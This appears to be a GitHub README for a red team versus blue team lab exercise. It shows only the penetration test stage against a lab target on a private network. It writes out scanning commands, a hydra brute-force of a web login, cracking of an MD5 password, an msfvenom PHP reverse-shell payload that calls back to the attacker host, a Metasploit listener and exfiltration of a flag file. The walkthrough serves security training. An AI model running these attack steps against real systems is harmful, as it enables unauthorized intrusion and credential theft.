# Attackers Vs Defenders

# **NETWORK TOPOLOGY**

![network-topology](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/network-topology.PNG)
-----------------------------------------------------------------------------------------------------------------
### *RED TEAM ENVIRONMENT*
![Red-Team](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/Red-Team.PNG)
-----------------------------------------------------------------------------------------------------------------
### *BLUE TEAM ENVIRONMENT*
![Blue-Team](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/Blue-Team.PNG)
-----------------------------------------------------------------------------------------------------------------

# **Red Team - Penetration Test**

- ### Identify the target IP
We need to run a network scan to locate the target IP address.
```
netdiscover -r <IP subnet>
 ```
  ![netdiscover command](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/netdiscover%20command.PNG)
  ![netdiscover](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/netdiscover.PNG)

| IP | Machine |
|:-------------:|:-------------:|
| 192.168.1.1 | Gateway IP, Hyper-V |
| 192.168.1.100 | ELK Server |
| 192.168.1.105 | Capstone, Target Machine |


- ### Scan Target IP
Now we will run a nmap scan to see what services and versions are on the target IP.
```
nmap -sV -v 192.168.1.105
```
![nmap command](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/nmap%20command.PNG)
![nmap-scan service & version](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/nmap-scan%20service%20%26%20version.PNG)
| Port | Service | Version |
|:--:|:--:|:--:|
| Port 22 | SSH | OpenSSH 7.6p1 |
| Port 80 | HTTP | Apache httpd 2.4.29 |

Now that we know an Apache websever is run on HTTP port 80, let's see what a agressive scan will show.
```
namp -A -vvv 192.168.1.105
```
![nmap aggressive scan command](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/nmap%20aggressive%20scan%20command.PNG)
![nmap-vvv-scan](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/nmap-vvv-scan.PNG)

We can see that HTTP port 80 is open and two usernames (hannah and ashton) which may be susceptible to a brute force attack.

- ###  Inspecting the Webserver 
Let's navigate the webserver and take a look.

![webserver](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/webserver.PNG)

In the company blog directory we can see a third username Ryan, who probably have the highest privilege of access as the CEO

![company_blog](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/company_blog.PNG)

In the *company folders* directory, we can see reference to a "*secret_folder*" for documents within this directory, which is now a target for this Penetration Test.

![company-fold_company-culture](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/company-fold_company-culture.PNG)

The *meet_our_team* folder confirms the three users, and each document has references the *secret_folder*.

![meet our team](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/meet%20our%20team.PNG)

![secret-folder_logon](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/secret-folder_logon.PNG)

Ashton's login screen, we need his password to gain access to his *secret_folder*.

- ###  Further Recon
Let's do a vulnerablity scan on the target IP.
```
nmap -A ---script=vuln -vvv 192.168.1.105
```
![nmap vuln scan command](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/nmap%20vuln%20scan%20command.PNG)
![vuln-scan3](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/vuln-scan3.jpg)
![vuln-scan4](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/vuln-scan4.PNG)
![vuln-scan7](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/vuln-scan7.PNG)

Returning from the nmap aggressive scan, we can see vulnerabilities were revealed.
 - Webdav vulnerability.
 - SQL Injection vulnerability across all directories on the webserver.
 - CVE-2017-15710 – Apache httpd vulnerability.
 
 - ###  Brute Forcing
 Now that we have some usernames and a main target (Ashton), using hydra we can attempt to bruteforce the login for the *secret_folder*.
 
 The CEO (Ashton), has a common password let's use the following command to get Ashton's password.
 
 ```
 hydra -l ashton -P /opt/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get "/company_folders/secret_folder"

 ```
![hydra command](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/hydra%20command.PNG)
![hydra bruteforce](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/hydra%20bruteforce.PNG)

- ###  SSH

```
ssh ashton@192.168.1.105
```
 We can gain ssh access into the server using Ashton's credentials.
 
 ![ssh-ashton](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/ssh-ashton.PNG)
 ![Ashton-id](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/Ashton-id.PNG)
 
 - ### Flag
 We find a flag in the root directory.
 ![Flag](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/Flag.PNG)
 
  Using Ashton's credentials we can also login to the webserver, and access the hidden folder.
  
  
  ![webserver ashton login](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/webserver%20ashton%20login.PNG)
  
  
  - ### Password Hash
 
 
  ![connect to corp server](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/connect%20to%20corp%20server.PNG)
  
  Inside this folder is a document with instructions on how connect to the *corp_server*. Also in the document are Ryan's hashed credentials and reference to a webdav directory.
  
  ![personal-note](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/personal-note.PNG)
  
  The hashed md5 password was instantly cracked using Crackstation, revealing the password *linux4u*
  
  ![crackstation](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/crackstation.PNG)
  
  - ### Webdav
  We will use Ryan's credentials to login to the webdav server.
  
  ![ryans login](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/ryans%20login.PNG)
  
  ![webdav](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/webdav.PNG)
  
  - ### Reverse Shell
  - ##### Msfvenom
  Next we will use msfvenom to upload a shell script to webdav, in order to create a reverse shell.
  
  ```
  msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 -f raw -o shell.php
  ```
  
  Create the payload *shell.php* with msfvenom.
  
  ![msfvenom](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/msfvenom.PNG)
  
  - #### Cadaver
  
  ```
  cadaver http://192.168.1.105/webdav
  ```
  
  Using cadaver and Ryan's credentials we accessed webdav, and uploaded the payload to the webdav directory.
  
  ![cadaver](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/cadaver.PNG)
  
  Use the put command.
  
  ![cadaver put-shell](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/cadaver%20put-shell.PNG)
   
  The payload was  delievered
   
  ![webdav shell](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/webdav%20shell.PNG)
  
  - #### Metasploit
  
  ```
  msfconsole
  ```
  
  ```
  use multi/handler
  ```
  
  Now that the payload has been uploadedthe the webdav server. To create the reverse shell, we need to setup a listener using Metasploit.
  
  ![uploaded-shell-webdav](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/uploaded-shell-webdav.PNG)
  
  ![metasploit](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/metasploit.PNG)
  
  After loading the exploit and activating the shell.php we uploaded earlier by clicking on it on the webserver, the target server connected to our listener and launched a         meterpreter session into their system.
  
  ![meterpreter](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/meterpreter.PNG)
  
  - ### Gaining Interactive Shell
  
  ```
  python -c 'import pty; pty.spawn("/bin/bash")
  ```
  
  ![interactive-shell](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/interactive-shell.PNG)
  
  - ### Locating the Flag
  
  The flag is located in the root directory.
  
  ![flag root-directory](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/flag%20root-directory.PNG)
  
  - ### Exfiltration
  
  The file was easily exfiltrated from the target manchine to the attacker machine.
  
  ![download-flag](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/download-flag.PNG)
  
  Downloaded flag on attackers machine.
  
  ![downloaded-flag-to-attack-machine](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/downloaded-flag-to-attack-machine.PNG)
  
  # Vulnerabilities
  ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
